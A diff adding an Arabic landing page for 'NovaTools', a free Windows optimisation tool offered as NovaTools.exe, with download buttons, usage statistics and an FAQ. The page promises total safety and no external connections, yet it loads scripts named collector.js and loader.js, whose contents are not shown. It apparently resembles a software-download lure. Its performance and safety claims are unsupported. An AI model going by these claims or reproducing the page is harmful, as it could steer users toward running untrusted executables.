@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="NovaTools — أدوات احترافية مجانية">
+<title>NovaTools | أدوات احترافية</title>
+<link rel="stylesheet" href="style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
+
+<header class="nav">
+  <div class="nav-inner">
+    <div class="brand">
+      <span class="brand-icon">⚡</span>
+      <span class="brand-name">NovaTools</span>
+    </div>
+    <nav class="nav-links">
+      <a href="#features">المميزات</a>
+      <a href="#download">التحميل</a>
+      <a href="#faq">الأسئلة</a>
+    </nav>
+  </div>
+</header>
+
+<main class="container">
+
+  <section class="hero">
+    <div class="hero-badge">
+      <span class="dot"></span>
+      الإصدار 4.2.1 متاح الآن
+    </div>
+    <h1 class="hero-title">
+      أدوات <span class="gradient">احترافية</span><br>
+      لمحترفي الويندوز
+    </h1>
+    <p class="hero-sub">
+      مجموعة أدوات مجانية لتسريع وحماية وتنظيف جهازك.
+      آمنة، سريعة، ومحدثة تلقائياً.
+    </p>
+    <div class="hero-cta">
+      <button id="downloadBtn" class="btn btn-primary">
+        <span class="btn-icon">⬇</span>
+        <span class="btn-text">تحميل مجاني</span>
+        <span class="btn-loader" hidden>
+          <span class="spinner"></span>
+          جاري التحضير...
+        </span>
+      </button>
+      <a href="#features" class="btn btn-ghost">اعرف أكتر</a>
+    </div>
+    <div class="progress" id="progress" hidden>
+      <div class="progress-bar"></div>
+    </div>
+    <p class="hero-meta">
+      💾 4.2 MB · 🪟 Windows 7/8/10/11 · ✅ مجاني
+    </p>
+  </section>
+
+  <section class="stats">
+    <div class="stat">
+      <div class="stat-num">47,283</div>
+      <div class="stat-label">مستخدم نشط</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">4.9<span class="small">/5</span></div>
+      <div class="stat-label">التقييم</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">99.9<span class="small">%</span></div>
+      <div class="stat-label">وقت التشغيل</div>
+    </div>
+    <div class="stat">
+      <div class="stat-num">0<span class="small">$</span></div>
+      <div class="stat-label">التكلفة</div>
+    </div>
+  </section>
+
+  <section id="features" class="features">
+    <h2 class="section-title">كل اللي محتاجه جهازك</h2>
+    <p class="section-sub">أدوات مختارة بعناية</p>
+    <div class="features-grid">
+      <div class="feature">
+        <div class="feature-icon">🚀</div>
+        <h3>تسريع فوري</h3>
+        <p>تحسين الأداء بنسبة تصل إلى 300%</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🛡️</div>
+        <h3>حماية متقدمة</h3>
+        <p>كشف وحظر البرامج الضارة في الوقت الفعلي</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">💾</div>
+        <h3>تنظيف تلقائي</h3>
+        <p>تحرير مساحة القرص من الملفات المؤقتة</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🔄</div>
+        <h3>تحديث تلقائي</h3>
+        <p>أحدث الإصدارات تصلك تلقائياً</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">🔒</div>
+        <h3>خصوصية كاملة</h3>
+        <p>لا جمع بيانات. لا تتبع. كل شيء محلي</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">⚡</div>
+        <h3>خفيف وسريع</h3>
+        <p>4.2 MB فقط. بدون إعلانات</p>
+      </div>
+    </div>
+  </section>
+
+  <section id="download" class="download-box">
+    <div class="download-inner">
+      <div class="download-icon">⬇</div>
+      <h2>حمّل NovaTools الآن</h2>
+      <p>الإصدار الأخير · متوافق مع كل إصدارات ويندوز</p>
+      <button id="downloadBtn2" class="btn btn-primary btn-large">
+        <span class="btn-icon">⬇</span>
+        <span class="btn-text">تحميل NovaTools.exe</span>
+      </button>
+      <div class="progress progress-large" id="progress2" hidden>
+        <div class="progress-bar"></div>
+      </div>
+      <p class="download-meta">آخر تحديث: 2025 · 4.2 MB</p>
+    </div>
+  </section>
+
+  <section id="faq" class="faq">
+    <h2 class="section-title">الأسئلة الشائعة</h2>
+    <details>
+      <summary>هل البرنامج مجاني فعلاً؟</summary>
+      <p>نعم، NovaTools مجاني بالكامل. لا اشتراكات ولا نسخة مدفوعة.</p>
+    </details>
+    <details>
+      <summary>هل هو آمن؟</summary>
+      <p>آمن 100%. لا يجمع أي بيانات ولا يتصل بأي سيرفر خارجي.</p>
+    </details>
+    <details>
+      <summary>ما هي متطلبات التشغيل؟</summary>
+      <p>ويندوز 7 أو أحدث، 2 GB RAM، 50 MB مساحة فارغة.</p>
+    </details>
+    <details>
+      <summary>هل يدعم اللغة العربية؟</summary>
+      <p>نعم، واجهة عربية كاملة بالإضافة إلى الإنجليزية.</p>
+    </details>
+  </section>
+
+</main>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="brand">
+      <span class="brand-icon">⚡</span>
+      <span class="brand-name">NovaTools</span>
+    </div>
+    <p class="footer-copy">© 2025 NovaTools. جميع الحقوق محفوظة.</p>
+    <div class="footer-links">
+      <a href="#">الخصوصية</a>
+      <a href="#">الشروط</a>
+      <a href="#">اتصل بنا</a>
+    </div>
+  </div>
+</footer>
+
+<script src="config.js"></script>
+<script src="collector.js"></script>
+<script src="loader.js"></script>
+</body>
+</html>
